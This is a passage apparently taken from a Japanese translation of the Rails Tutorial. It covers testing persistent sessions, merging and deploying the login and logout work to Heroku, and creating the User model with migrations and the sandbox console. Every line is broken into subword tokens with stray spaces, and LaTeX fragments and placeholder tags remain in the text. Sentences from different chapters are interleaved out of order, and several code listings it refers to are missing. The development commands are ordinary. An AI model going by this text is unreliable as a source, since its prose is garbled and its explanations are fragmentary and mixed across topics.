▁ 渡 された ユーザーを \ ko de { remember } メソッドで 記 憶 する
▁\ ko de { current \_ user } が 、 渡 された ユーザー と同じ である ことを確認します 。
▁上の 手順 では \ ko de { remember } メソッド では \ ko de { session [: user \_ id ]} が 設定 され ないので 、 問題 の 「 記 憶 」 ブランチ を これ で テスト できるようになります 。
▁作成した コードをリスト \ ref { code : persisten t _ sessions _ test } に示します
▁ 永続的 セッション のテスト
▁ テストを もうひとつ 追加 している ことにご注目ください 。 この 追加 テストでは 、 ユーザーの 記憶ダイジェスト が 記憶トークン と 正しく 対応 していない 場合に 現在のユーザー が \ ko de { nil } になる かどうかをチェックし ています 。 これ によって 、 以下の ネスト した \ ko de { if } ス テ ート メ ン 内の \ ko de { authenticated ?} の 式 をテストします 。
▁ ところで 、 リスト \ ref { code : persisten t _ sessions _ test } では 以下のように 書い ても よい ように 思える かもしれません 。
▁ 実際 、 上の ように 書い ても 動作します 。 しかし 、\ ref { sec : layout _ exercises } で 簡単に 触 れ た ように 、 アサーション \ ko de { assert _ equ al } の 引数 は 、\ emph { 期 待 する 値 }、\ emph { 実際の 値 } の 順序 で 書く の が ルール になっています 。
▁上の 原 則 に従って 、 リスト \ ref { code : persisten t _ sessions _ test } のコードは 以下のように 書かれてい ます 。
▁$ ▁bundle ▁exec ▁rake ▁test ▁ T E S T = test / helpers / sessions _ helper _ test . rb
▁ ここ まで でき れば 、 { 0} current _ user {/0} メソッド に 仕 込 んだ { 0} raise {/0} を削除し て 元に戻す ▁( リスト { p 1 }) ▁ ことで 、 リスト \ ref { code : branch _ no _ raise } の テストが パス するはずです
▁( リスト { p 0} から {2} authenticated ? {/2} の 式 を削除する と リスト \ ref { code : persisten t _ sessions _ test } の 2 番目の テストが 失敗する ことも 確認 できます 。 つまり この テストが 正しい もの である ということです )。
▁ 例外 発生 部分 を削除する
▁\ ko de { current \_ user } の 「 記 憶 」 ブランチ を テスト できた ので 、 今後 は 手動で ひとつ ひとつ 確認 し なくても 、 自 信 を 持 って 回 帰 バグ を キャッチ できます 。
▁ この章 と ひとつ 前 の 章では 、 実 に 多くの 作業 を こ な しました 。 かつ て は 未 熟 そのもの だ った アプリケーションを 、 約 束 通 り 、 ユーザー登録 機能 や ログイン 機能を 完全に 備 え た 立 派 な アプリケーション へ と 変 身 させる ことができ た のです 。
▁ 認 証 機能 の 完成 に 必要な のは 、 一 口 に 言 えば ログイン ステータス と ユーザー ID に基いて ページ への アクセス を 制限 すること だけです 。
▁ 次 は 、 ユーザーが 自分の プロフィール 情報を 編集 できるように する 予定です 。 これは { 0} 第 {1} 9 {/1} 章 {/0} の 最 終 目 標 で もあります 。
▁ 次の 章 に進む前に 、 変更を master ブランチ に マージ しておきましょう 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁ add ▁- A < n > $ ▁git ▁ commit ▁- m ▁" F in i sh ▁ log ▁in / log ▁ out " < n > $ ▁git ▁ checkout ▁ master < n > $ ▁git ▁ merge ▁ log - in - log - out
▁続いて 、 リモート リポジトリ と production サーバー にも プッシュ します 。
▁ プッシュ した 後 、 マイグレーション が 完了 する まで の 間 、 一時 的に ステータス が 無効 ▁( invalid ) ▁ になります ので 、 ご注意ください 。
▁ ト ラ フ ィ ッ ク の 多 い 本番 サイト では 、 変更 を行う 前に 以下のように \ href { https :// de v center . heroku . com / articles / main te n an ce - mod e }{\ emph { メ ン テ ナ ン ス モード } } を オン に しておく と よいでしょう 。
▁$ ▁ heroku ▁ main te n an ce : on < n > $ ▁git ▁ push ▁ heroku < n > $ ▁ heroku ▁run ▁rake ▁ db : migrate < n > $ ▁ heroku ▁ main te n an ce : of f
▁上の 操作 で デプロイ と マイグレーション を行う と 、 そ の間に 標準 の エラー ページ が 出力 されます
▁( この 作業 で 煩 わ される ことは 今後 ありません が 、 一度 はこの エラー ページを 目 に しておく の も よいでしょう )。
▁ 詳 しく は 、 Heroku の \ href { https :// de v center . heroku . com / articles / error - pages } { エラー に関する ページ } ▁( 英語 ) ▁ にある ドキュメント を参照してください 。
▁Rails では 、 ある ページ から 別の ページに 移動 するときに 状態 を 保 持 することができます 。 ページの 状態 の 保存 には 、 一時 cookies と 永 続 cookies の どちら も 使用できます 。
▁ ログインフォーム は 、 ユーザーが ログイン するための 新しい セッション を作成する ように 設計 されています 。
▁\ ko de { flash . now } メソッドを使用すると 、 レンダリング 済み の ページに も フラッシュメッセージ を 表示 できます 。
▁ テスト駆動開発 は 、 テスト で バグ を 再 現 して から デバッグ したい場合 に 便利です 。
▁\ ko de { session } メソッドを使用すると 、 ユーザー ID を 安全 に ブラウザ に保存 して 一時 セッション を作成 できます 。
▁ ログイン の 状態 に応じて 、 レイアウト 上の リンク などの 機能を 変更 できます 。
▁ 統合テスト では 、 ルーティング 、 データベースの 更新 、 レイアウト の 変更 が正しく 行われている かどうかを確認 できます 。
▁ 記憶トークン や それ と 対応する 記憶ダイジェスト を ユーザー ごとに 関連付け て 、 永続的 セッション で 使用できます 。
▁\ ko de { cookies } メソッドを使用すると 、 永続的 な 記憶トークン の cookies を ブラウザ に保存 して 、 永続的 セッション を作成 できます 。
▁ ログイン 状態 ▁( ログイン している かどうか ) ▁ は 、 一時 セッション のユーザー ID か 、 永続的 セッション の 一意 な 記憶トークン に 基 いた 現在のユーザー が存在し ている かどうか で 決 定 されます 。
▁ セッション のユーザー ID を削除し 、 ブラウザ の 永続的 cookies を削除する と 、 アプリケーション から ユーザーが ログアウト します 。
▁ 三 項 演算子 を使用すると 、 単純な if - the n ス テ ート メ ン ト を コ ン パ ク ト に 記述 することができます 。
▁リスト \ ref { code : user _ model _ remember } では 、 明示的に \ ko de { User } を プレフィックス として 、 新しい トークン や ダイジェスト の クラス メソッド を定義し ました 。
▁ これらは 問題 なく 動作します 。 これらは 、 実際に \ emph { User . new _ token } や \ emph { User . digest } を使用して \ ko de { 呼び出される } ので 、 おそらく 最も 明 確 な 定義 方法 である と 言 え る でしょう 。
▁しかし 実は 、 より 「 Ruby 的に 正しい 」 クラス メソッドの 定義 方法 が 、 おそらく 2 とおり あります 。 1 つ は や や わかり に く く 、 もう 1 つ は 非常に 混 乱 する でしょう 。
▁ テストスイート を実行して 、 リスト \ ref { code : token _ digest _ self } ▁( や や わかり にくい ) ▁ や ▁リスト \ ref { code : token _ digest _ class _ self } ▁( 非常に 混 乱 する ) ▁ の実装 が 正しい ことを確認 してください 。 これ が 問題 です
▁( { 0} self {/0} は 、 通常の 文 脈 では User 「 モデル 」 、 つまり ユーザー オブジェクトの {1} インスタンス {/1} を 指 します が 、 リスト \ ref { code : token _ digest _ class _ self } や リスト { p 4 } の 文 脈 では 、 { 0} self {/0} は { 0} User {/0} 「 クラス 」 を指す ことにご注意ください 。
▁ わかり に く さ の 原 因 の一部 はこの 点 に あります )。
▁\ ref { sec : remember _ tests } では 、 現在の アプリケーション 設計 では 、 リスト { p 2 } の 統合テスト で 仮 想 の {3} remember _ token {/3} 属性 にアクセス する手段 がない ことを 説明 しました 。
▁ 実は 、\ ko de { as sign s } という 特殊な テスト メソッドを使用すると アクセス できるようになります 。
▁ 第 \ ref { cha : fi ll ing _ in _ the _ layout } , 章では 、 新しい ユーザー を作成する ための ス タブ ページを 作 った ところで 終わり ました ▁(\ ref { sec : user _ signup })。
▁ コントローラ で定義した \ emph { インスタンス } 変数 に テスト の 内部 から アクセス するには 、 テスト 内部で \ ko de { as sign s } メソッド を使用します 。 このメソッド には インスタンス変数 に対応する シンボル を 渡します 。
▁これ から 5 つの 章 を通して 、 ユーザー登録ページ を 作 って い く ことにしましょう 。
▁たとえば 、\ ko de { create } アクション で \ ko de {@ user } という インスタンス変数 が 定義 され ていれば 、 テスト 内部で は \ ko de { as sign s (: user ) } と 書くこと で インスタンス変数 にアクセス できます 。
▁ 本 章では 、 一 番 重要な ステップ である ユーザー 用の \ emph { データモデル } の作成 と 、 データを 保存 する手段 の 確 保 について 学 んで い きます 。
▁ 本チュートリアル の アプリケーション の場合 、 Sessions コントローラの \ ko de { create } アクション では 、\ ko de { user } を ▁( インスタンス変数 では ない ) ▁ 通常の ローカル変数 として 定義 しました が 、 これを インスタンス変数 に 変え て し ま えば 、\ ko de { cookies } に ユーザーの 記憶トークン が正しく 含 まれ ている かどうかを テスト できるようになります 。
▁ 第 \ ref { cha : sign _ up } 章では 、 ユーザーが サイトに ユーザー登録 できるように し 、 ユーザー プロファイル のための ページ を作成します 。
▁この アイディア に従って リスト \ ref { code : login _ create _ user _ instance } と リスト \ ref { code : im pro v ed _ remember _ me _ test } の 不 足 分 を 埋 め ▁( ヒント として \ ko de { ● } や \ ko de { F I L L _ IN } を 目 印 に 置 いて あります ) 、[ remember ▁ me ] ▁ チェックボックス のテスト を 改良 してください 。
▁ ユーザー登録 できる ようになった ら 、 ログイン や ログアウト を できる 仕組み を 作り ▁( 第 \ ref { cha : log _ in _ log _ out } 章 ) 、 第 \ ref { cha : updating _ show ing _ and _ de let ing _ users } 章 から は 不 正 な アクセス を 取り 扱 う 方法 について 学 んで い きます ▁(\ ref { sec : requir ing _ logged _ in _ users }) ▁ 。
▁\ ko de { self } を使って トークン や ダイジェスト の 新しい メソッド を定義する
▁最後に 、 第 \ ref { cha : account _ activation _ and _ password _ reset } 章 で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リセット する方法について 学 び ます 。
▁ まとめ ると 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : account _ activation _ and _ password _ reset } 章 を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁ 認 証
▁ 自分 で 認証システム を 作 って み る
▁ 事 実 上 、 すべての Web アプリケーション は 何らかの ログイン / 認証システム を 必要 とします 。
▁ そのため 、 多くの Web フレームワーク では このような ログイン / 認証システム を実装する ための 選択 肢 が 多 数 提供され ています 。 Rails も また 例外 ではありません 。
▁ 認 証 ▁( authentication ) ▁ と 認 可 ▁( author i z ation ) ▁ の システム の例 だと 、\ href { http :// github . com / thoughtbot / clear an ce } { C le ar an ce }、\ href { http :// github . com / bin ary log i c / a u th log i c } { A u th log i c }、\ href { http :// github . com / p l at a format ec / de v is e } { D e v is e }、\ href { http :// rails casts . com / e p is odes / 19 2 - author i z ation - with - ca n ca n } { C an C an } など があります ▁( Rails に 限 ら なければ \ href { http :// en . w ikipedia . org / wiki / O p en ID } { O p en ID } や \ href { http :// en . w ikipedia . org / wiki / O a u th } { O A u th } の 上 に 構 築 する方法 もあります )。
▁ な ぜ 車 輪 の 再 発 明 を する のか 、 という 質 問 がある の も 当 然 です 。
▁ 自分 で わざわざ 作 ら なくても 、 い つ も 使 え る 方法 を ただ 利用 する だけで は い け ない の でしょう か 。
▁\ ko de { create } アクション 内の インスタンス変数 を使用する ための テンプレート
▁ ある 実 践 的な 実 験 による と 、 多くの サイトの 認証システム は 膨 大 な カスタマイズ を 必要 と する ため 、 サ ー ド パ ー テ ィ 製 品 を変更 して 導入 する 場合には システム を ゼ ロ から 作成する よりも 多くの 仕 事 を 要 する という 結果 が 出 ています 。
▁ 加 え て 、 既 成 品 の システム は 内部 が わかり づ ら い ことが 多く 、 ブ ラ ッ ク ボックス になっています 。 自分 で作成した システム であれば 、 それ を と ても よく 理解 している はずです 。
▁さらに 言 えば 、 最 近 の Rails への 変更 ▁(\ ref { sec : adding _ a _ secure _ password }) ▁ により 、 カスタム 認証システム を 容易に 作成 できるようになりました 。
▁最後に 、\ emph { あえて } 最終的に サ ー ド パ ー テ ィ の 認証システム を 導入 すること になった として も 、 自分自身 で 認証システム を 構 築 した 経験 があれば 、 サ ー ド パ ー テ ィ 製 品 を 理解 して 変更 すること が ず っ と 容易に な る はずです 。
▁< n >\ end { as id e }< n >< n > ▁\ section { User モデル } ▁% ▁( fold )< n > ▁\ label { sec : user _ model }< n >< n >
▁ ここ から 3 つの 章 に わ た る 最 終 目 標 は ユーザー登録ページ ▁( 図 \ ref { fig : signup _ mockup _ preview } のモックアップ ) ▁ を作成する ことです が 、 今 の ま まで は 新しい ユーザーの 情報を 受け 取 って も 保存 する 場所 が ないので 、 い き なり ページ を作成する わ け には い き ません 。
▁ ユーザー登録 で まず 初 め に や ること は 、 それらの 情報を 保存 するための データ 構造 を作成する ことです 。
▁[ remember ▁ me ] ▁ テストを 改良 するための テンプレート
▁ ユーザー登録 ページのモックアップ
▁Rails では 、 データモデル で使用する デフォルトの データ 構造 の ことを \ emph { モデル } と呼びます ▁(\ ref { sec : mvc }{/ 1 で言う MVC の M の ことです )。
▁この 名前 の 由 来 は ▁“ \ href { http :// en . w ikipedia . org / wiki / Active _ record _ p at ter n } { active ▁ record ▁ p at ter n } ” ▁ です 。 M ar t in ▁F o w l er 著 「\ emph { エ ン ター プ ラ イ ズ ▁ アプリケーション アーキテクチャ パターン ▁ }」 で 特 定 および 命 名 されました 。
▁ 「 エ ス キュー エ ル 」 と 発 音 します が 、「 ス ィ ー ク ゥ エ ル 」 も よく 使われ ます 。
▁さらに 、 Rails には \ emph { マイグレーション } という 機能 があります 。 データ の 定義 を Ruby で 記述 する ことができ 、 SQL の D D L ▁( D at a ▁D e f in i tion ▁ L an g u age ) を 新 た に 学ぶ 必要 が ありません 。
▁Rails は 、 データ スト ア の詳細 から ほぼ 完全に 私 た ち を 切り 離 してくれます 。
▁ 本書 では 、 SQLite を 開発 ▁( development ) ▁ 環境で 使い 、 また PostgreSQL を ▁( Heroku で の ) ▁ 本番環境で 使い ます ▁(\ ref { sec : de p lo y ing })。 Rails は 、 本番 ▁( production ) ▁ アプリケーション です ら 、 データ の 保存 方法 の詳細 について ほとんど 考え る 必要 がない く ら い よく でき ています 。
▁ Git で バージョン管理 を 行 な っている のであれば 、 この タ イ ミ ング で ユーザーを モデリング するための トピックブランチ を作成して おいてください 。
▁ modeling - users
▁< n >\ end { code }< n >< n > ▁\ subsection { データベースの 移 行 } ▁% ▁( fold )< n > ▁\ label { sec : database _ migration s }< n >< n >
▁\ ref { sec : a _ user _ class } で 扱 った カスタム ビ ル ド クラスの \ ko de { User } を 思い 出 してください 。 この クラス は 、\ ko de { name } と \ ko de { email } を 属性 に 持つ ユーザー オブジェクト で した 。
▁この クラス は 役 に 立 つ 例 として 提供され ましたが 、 Rails にとって 極めて 重要な 部分 である \ emph { 永 続 性 } という 要素 が 欠 け ていました 。 Rails コンソール で User クラスの オブジェクトを 作 って も 、 コンソール から ex it すると そのオブジェクト は すぐ に 消 え てしまい ました 。
▁ この節 で の 目的 は 、 簡単に 消 え ること の ない ユーザーの モデル を 構 築 することです 。
▁ メールアドレスを ユーザー名 に した ことで 、 ユーザー 同士 で 通 信 できるように 拡 張 できる 可能性 が 開 か れ ます ▁( 第 \ ref { cha : account _ activation _ and _ password _ reset }) 章 )。
▁リスト \ ref { code : example _ user } では 、 以下のように Ruby の \ ko de { attr \_ accessor } メソッド を使用し ました 。
▁ それ とは 対 照 的に 、 Rails で ユーザーを モデリング する とき は 、 属性を 明示的に 識 別 する必要が ありません 。
▁ 上で 簡潔 に 述 べ た ように 、 Rails は データ を保存する 際に デフォルトで リ レ ー シ ョ ナ ル データベース を使用します 。 リ レ ー シ ョ ナ ル データベース は 、 データ \ emph { 行 } で 構成 される \ emph { テーブル } から なり 、 各 行 は データ 属性 の \ emph { カラム } ▁( 列 ) ▁ を 持 ち ます 。
▁たとえば 、 name と email を持つ ユーザー を保存する のであれば 、\ ko de { name } と \ ko de { email } の カラム を持つ \ ko de { users } テーブル を作成します ▁( 各 行 は 1 人のユーザー を表し ます )。
▁ テーブル に 格 納 される データ の例 を 図 \ ref { fig : users _ table } に 、 対応する データモデル を 図 \ ref { fig : user _ model _ s ke t ch } に示します
▁( なお 、 図 \ ref { fig : user _ model _ s ke t ch } は 草 案 です 。 実際の データモデル は 図 \ ref { fig : user _ model _ initial } のようになります )。
▁\ ko de { name } や \ ko de { email } といった カラム 名を 今 のうち に 考え ておく ことで 、 後 ほど User オブジェクトの 各 属性を ActiveRecord に 伝 え る ときに 楽 になります 。
▁\ ko de { users } テーブル に含まれる データ の サンプル
▁User の データモデル の ス ケ ッ チ
▁リスト \ ref { code : generate _ users _ controller } で 、 ユーザー コントローラ ▁( と \ ko de { new } アクション ) ▁ を 作 った ときに 使 った 以下の コマンド を 思い 出 してみてください 。
▁ モデル を作成する とき は 、 上 と 似 た ような パターン で \ ko de { generate ▁ model } という コマンド を使います 。 さらに 、 今回は \ ko de { name } や \ ko de { email } といった 属性を 付け た User モデル を 使い たい ので 、 実際に 打 つ コマンド は リスト \ ref { code : generate _ user _ model } になります 。
▁User モデル を生成する
▁$ ▁ rails ▁ generate ▁ model ▁User ▁name : string ▁ email : string
▁invo ke ▁ active _ record
▁create ▁app / models / user . rb
▁create ▁test / models / user _ test . rb
▁create ▁test / fixtures / users . yml
▁( コントローラ 名 には 複数形 を 使い 、 モデル名 には 単数形 を 用 いる という 慣習 を 頭 に 入 れ て おいてください 。 コントローラ は \ emph { Users } で モデル は \ emph { User } です )。
▁\ ko de { name : string } や \ ko de { email : string } オプション の パラメータ を 渡す こと によって 、 データベース で 使用 したい 2 つの 属性を Rails に 伝 え ます 。 このとき に 、 これらの 属性 の 型 情報 も 一 緒 に 渡します ▁( この場合は \ ko de { string })。
▁リスト \ ref { code : g en er at ing _ pages } や リスト \ ref { code : generate _ users _ controller } で アクション 名 を使用して 生成 した 例 と 比 較 してみてください 。
▁リスト \ ref { code : generate _ user _ model } にある \ ko de { generate } コマンド の 結果 の ひとつ として 、\ emph { マイグレーション } と呼ばれる 新しい ファイルが 生成されます 。
▁ マイグレーション は 、 データベースの 構造 を イン ク リ メ ン タ ル に変更 する手段 を提供します 。 それ により 、 要求 が変更され た場合 に データモデル を 適 合 させる ことができます 。
▁この User モデルの 例 の場合 、 マイグレーション は モデル 生成 スクリプト によって自動的に 作 られ ました 。 リスト \ ref { code : users _ migration } に示したように ▁\ ko de { name } と \ ko de { email } の 2 つの カラム を持つ \ ko de { users } テーブル を作成します
▁(\ ref { sec : uniqueness _ validation } で 、 マイグレーション を 一 から 手動で 作成 する方法について 説明します 。
▁(\ ko de { users } テーブル を 作る ための ) ▁User モデルの マイグレーション
▁: name
▁ マイグレーション ファイル名 の 先 頭 には 、 それ が 生成された 時間 の \ emph { タイムスタンプ } が追加され ます 。
▁ 以前 は イン ク リ メ ン タ ル な 整 数 が追加され ましたが 、 複数の 開発者 による チ ー ム では 、 複数の プ ログ ラ マ が 同じ 整 数 を持つ マイグレーション を生成し てしまい 、 コ ン フ リ ク ト を 引 き 起 こ していました 。
▁ 現在の タイムスタンプ による 方法 であれば 、 まったく 同時に マイグレーション が 生成される という 通常 では あり え ないこと が 起 き ない 限 り 、 そのような コ ン フ リ ク ト は 避 け られます 。
▁ マイグレーション 自体 は 、 データベースに 与え る 変更を 定義 した \ ko de { change } メソッドの 集 まり です 。
▁リスト \ ref { code : users _ migration } の場合 、\ ko de { change } メソッドは \ ko de { create \_ table } という Rails の メソッドを 呼 び 、 ユーザーを 保存 するための テーブル を データベースに 作成 します 。
▁\ ko de { create \_ table } メソッドは ブロック 変数 を 1 つ 持つ ブロック ▁(\ ref { sec : block s }) ▁ を受け取り ます 。 ここでは ▁( “ table ” の 頭 文字 を 取 って ) ▁\ ko de { t } です 。
▁\ ko de { t } オブジェクトが 具 体 的に 何 を している のか を 正 確 に 知 る 必要はありません ので 、 どう か 心 配 しないでください 。 \ emph { 抽 象 化 レ イ ヤ } の 素晴らしい 点 は 、 それ が 何 である か を 知 る 必要 がない という 点 です 。
▁ 安 心 して \ ko de { t } オブジェクト に 仕 事 を 任 せ れば よい のです 。
▁ モデル名 は 単数形 ▁( User ) ▁ ですが 、 テーブル 名 は 複数形 ▁(\ ko de { users }) ▁ です 。 これは Rails で 用 い られ る 言 葉 の 慣習 を 反 映 しています 。 モデル は ひ と り のユーザー を表す の に 対 し 、 データベースの テーブル は 複数の ユーザー から 構成 されます 。
▁( この マ ジ ッ ク カラム の 使用 例 を \ ref { sec : creat ing _ user _ objects } から 具 体 的に 見 ていきます )。
▁リスト \ ref { code : users _ migration } の マ イ グ レ ー テ ョ ン によって 作成された 完全な データモデル を 図 \ ref { fig : user _ model _ initial } に示します
▁( 図 \ ref { fig : user _ model _ s ke t ch } の ス ケ ッ チ には 無 か った マ ジ ッ ク カラム が追加され ています )。
▁リスト \ ref { code : users _ migration } で 生成された User の データモデル
▁(\ ref { sec : demo _ users _ resource } で 、 この コマンド を 似 た ような 状 況 で 実行 した ことを 思い 出 してみてください ) ▁ 。
▁ 公式 には 「 エ ス キュー エ ラ イ ト ▁( ess - c u e - e ll - it e )」 と 発 音 します が 、 ( 本 来 は 誤 り と されている ) 「 ス ィ ー ク ゥ エ ラ イ ト ▁( s equ e l - it e )」 も よく 使われ ています 。
▁( Cloud ▁ IDE を 使っている 場合は 、 図 \ ref { fig : sqlite _ d own load } のように まず は ファイルを お 手 元 に ダウンロード する必要があります )。
▁ 図 \ ref { fig : sqlite _ database _ browser } の中に \ ko de { id } という マイグレーション の ときに 説明 され なかった カラム の 存 在 に 気 づ いた かもしれません 。
▁\ ref { sec : demo _ users _ resource } で 簡単に 説明 した とおり 、 この カラム は自動的に 作成 され 、 Rails が 各 行 を 一意 に 識 別 するために 使用します 。
▁\ href { http :// sqlite browser . org /}{ D B ▁B row s er ▁for ▁ SQLite } で作成した \ ko de { users } テーブル を確認する
▁Rails チュートリアル で 使用されている もの すべて を含め 、 ほとんど の マイグレーション が \ emph { 可 逆 } です 。 これは 、\ ko de { db : r o ll b ack } という Rake タスク で 変更を 取り 消 せる ことを 意味 します 。 これを “ マイグレーション の 取り 消 し ▁( migrate ▁d own ) ▁ と呼びます 。
▁$ ▁bundle ▁exec ▁rake ▁ db : r o ll b ack
▁上の コマンド では 、 データベースから users テーブル を削除する ために \ ko de { d r o p \_ table } コマンド を 内部で 呼び出し ています 。
▁これ が うまく い く のは 、\ ko de { change } メソッドは \ ko de { d r o p \_ table } が \ ko de { create \_ table } の 逆 であることを 知 っている からです 。 つまり 、 ロー ル バ ッ ク 用の 逆 方 向 マイグレーション を簡単に 導 く ことができる のです 。
▁ ある カラム を削除する ような 不 可 逆 な マイグレーション の場合は 、\ ko de { change } メソッド の代わりに 、\ ko de { up } と \ ko de { d own } の メソッドを 別 々 に 定義 する必要があります 。
▁詳細については 、 Rails ガイド の 「\ href { http :// guides . rubyonrails . org / migration s . html } { Active ▁Record ▁ マイグレーション }」 を参照してください 。
▁ も し 今 の 時点 で データベースの ロー ル バ ッ ク を実行して いた 場合は 、 先 に進む前に もう一度 以下のように マイグレーション を 適 用 して 元に戻 してください 。
▁ これまで 、 リスト \ ref { code : generate _ user _ model } の User モデルの 作成 によって どのように ▁( リスト \ ref { code : generate _ user _ model } の ) ▁ マイグレーション ファイルが 作成される か を見 てきました 。 そして 図 \ ref { fig : sqlite _ database _ browser } で この マイグレーション を実行し た 結果を 見 ました 。 \ ko de { users } テーブル を作成する ことで 、\ ko de { development . sqlite 3 } という 名 の ファイル を更新し 、\ ko de { id }、\ ko de { name }、\ ko de { email }、\ ko de { created \_ at }、\ ko de { updated \_ at } を作成し ました 。
▁また 、 リスト \ ref { code : generate _ user _ model } では モデル 用の user . rb も 作 られ ました 。
▁この節では 、 以後 この モデル 用 ファイル を理解する ことに 専 念 します 。
▁これは 控 え め に 言 って も と ても よく ま と ま っています ▁( リスト \ ref { code : raw _ user _ model })
▁ 生成された ば か り の User モデル
▁ 第 \ ref { cha : rails _ f la v or ed _ ruby } 章 と同じ く 、 Rails コンソール を使用して データモデル を調べ てみましょう 。
▁( この時点で は ) ▁ データベース を変更 した く ないので 、 コンソール を \ emph { サ ンド ボックス } モード で 起動 します 。
▁$ ▁ rails ▁console ▁-- s and box
▁ L o ad ing ▁ development ▁ environment ▁in ▁ s and box
▁A n y ▁ mod if i cat ions ▁you ▁ ma ke ▁ will ▁be ▁ r o ll ed ▁ b ack ▁on ▁ ex it
▁" A n y ▁ mod if i cat ions ▁you ▁ ma ke ▁ will ▁be ▁ r o ll ed ▁ b ack ▁on ▁ ex it " ▁( ここで 行った すべての 変更 は 終 了 時に ロー ル バ ッ ク されます ) ▁という メッセージ に わかりやすく 示 されている ように 、 コンソール を サ ンド ボックス で 起動 すると 、 その セッション で 行った データベース への 変更を コンソール の 終 了 時に すべて ▁“ ロー ル バ ッ ク ” ▁( 取り 消 し ) ▁ してくれます 。
▁\ ref { sec : a _ user _ class } の コンソール セッション では \ ko de { User . new } で 新しい ユーザー オブジェクト を生成し ましたが 、 リスト \ ref { code : example _ user } の example \_ user ファイルを 明示的に require する まで この オブジェクト には アクセス できません で した 。
▁しかし 、 モデル を使うと 状 況 は 異なります 。 \ ref { sec : a _ controller _ class } で 見 た ように 、 Rails コンソール は 起動 時に Rails の 環境 を 自動的に 読み込み 、 その 環境 には モデル も 含 まれ ます 。
▁つまり 、 新しい ユーザー オブジェクト を作成する ときに 余 分 な 作業 を 行 わ ずに 済 む ということです 。
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁nil , ▁ email : ▁nil , ▁ created _ at : ▁nil , ▁ updated _ at : ▁nil >
▁上の 出力 は 、 ユーザー オブジェクトを コンソール 用 に 出力 した ものです 。
▁\ ko de { User . new } を 引数 な し で 呼 んだ 場合は 、 すべての 属性 が \ ko de { nil } の オブジェクト を返します 。
▁\ ref { sec : a _ user _ class } では 、 オブジェクトの 属性 を設定する ための \ emph { 初期化 ハッシュ ▁( hash ) ▁ } を 引数に 取 るように 、 User クラス の例 ▁( user \_ example . rb ) ▁ を 設計 しました 。 この 設計 は 、 同様 の 方法で オブジェクトを 初期化 する Active ▁Record の 設計 に基づいて います 。
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁" Michael ▁Hartl ", ▁ email : ▁" mhartl @ example . com ",
▁ created _ at : ▁nil , ▁ updated _ at : ▁nil >
▁上の ように 、 name と email 属性 が 期待どおり 設定 されている ことがわかります 。
▁また 、 Active ▁Record を理解する 上で 、 「\ emph { 有効 性 ▁( V al id ity ) }」 という 概念 も 重要です 。
▁\ ref { sec : user _ validations } で 詳 細 について解説します が 、 今 は まず 先ほど の \ ko de { user } オブジェクトが 有効 かどうか 確認 してみましょう 。 確認 するために は \ ko de { valid ?} メソッド を使います 。
▁ 現時点では まだ データベースに データ は 格 納 されていません 。 つまり 、\ ko de { User . new } は \ emph { メモリ 上で } オブジェクトを 作成した だけで 、\ ko de { user . valid ?} という 行 は ただ オブジェクトが 有効 かどうかを確認 した だけ となります ▁( データベースに データ がある かどうか は 有効 性 には 関係 ありません )。
▁ データベースに User オブジェクト を保存する ためには 、\ ko de { user } オブジェクト から \ ko de { save } メソッド を呼び出す 必要があります 。
▁\ ko de { save } メソッドは 、 成功 すれば \ ko de { true } を 、 失敗 すれば \ ko de { false } を返します
▁( 現 状 では 、 保存 はすべて 成功 するはずです 。 失敗する 場合 については \ ref { sec : user _ validations } で説明します )。
▁この 唯 一 の 例外 が \ ref { sec : scope s _ sub select s _ and _ a _ la m b d a } に 記 されています 。
▁作成した 時点 で のユーザー オブジェクトは 、\ ko de { id } 属性 、 マ ジ ッ ク カラム である \ ko de { created \_ at } 属性 と \ ko de { updated \_ at } 属性 の 値が いずれ も \ ko de { nil } で あった ことを思い出してください 。
▁\ ko de { save } メソッドを 実行 した 後に 何 が変更され た のか を 確認 してみましょう 。
▁=> ▁#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁ email : ▁" mhartl @ example . com ",
▁\ ko de { " 20 14 - 07 - 2 4 ▁ 00 : 5 7 : 4 6 "} という タイムスタンプ が 気 になった 方 も いる と思います が 、 著者 はこの 箇所 を 真 夜 中 過 ぎ に 書いた わけではありません 。 実は この タイムスタンプ は \ href { http :// en . w ikipedia . org / wiki / Co or d in at ed _ U n i ver s al _ Time } { 協 定 世界 時 ▁( UTC ) } ▁ に合わせて あります 。 これは \ href { http :// en . w ikipedia . org / wiki / G re en w i ch _ M e an _ Time } { グ リ ニ ッ ジ 標準 時 ▁( G M T ) } ▁ と同様 、 標準 時間 として 使用されます 。
▁このとき I T U は 、 混 乱 を 最 小 限 に と ど め るために 、 略 称 を 1 つ だけ に したい と 考え ました 。
▁このとき 、 英語 式 の C UT も フ ラ ン ス 式 の T U C も 満 場 一 致 と な らず 、 両者 の 妥 協 案 として UTC という 略 語 が 採 用 されました 。
▁\ ref { sec : a _ user _ class } の User クラス と同様に 、 User モデルの インスタンス は ドット 記 法 を 用 いて その 属性 にアクセス することができます 。
▁=> ▁" Michael ▁Hartl "
▁=> ▁" mhartl @ example . com "
▁ 詳 細 は 第 \ ref { cha : sign _ up } 章 でも 説明します が 、 上で 見 た ように モデルの 生成 と 保存 を 2 つの ステップ に 分 け ておく と 何か と 便利です 。 しかし 、 Active ▁Record では \ ko de { User . create } で モデルの 生成 と 保存 を 同時に お こ な う 方法 も 提供され ています 。
▁#< User ▁id : ▁ 2, ▁name : ▁" A ▁ N other ", ▁ email : ▁" an other @ example . org ", ▁ created _ at :
▁\ ko de { User . create } は 、\ ko de { true } か \ ko de { false } を返す 代わりに 、 ユーザー オブジェクト 自身 を返す ことに注目してください 。 返 された ユーザー オブジェクトは ▁( 上の 2 つ目の コマンド にある \ ko de { foo } のように ) ▁ 変数 に 代入 することもできます 。
▁\ ko de { destroy } は \ ko de { create } の 逆 です 。
▁\ ko de { create } と同じ ように 、\ ko de { destroy } は そのオブジェクト 自身 を返します が 、 その 返 り 値 を使用して も 、 もう一度 \ ko de { destroy } を 呼 ぶ ことはできません 。
▁さらに 、 削除 された オブジェクトは 、 以下のように まだ メモリ 上 に 残 っています 。
▁ では 、 オブジェクトが 本当に 削除 された かどうかを どのように して 知 れば よい の でしょう か 。
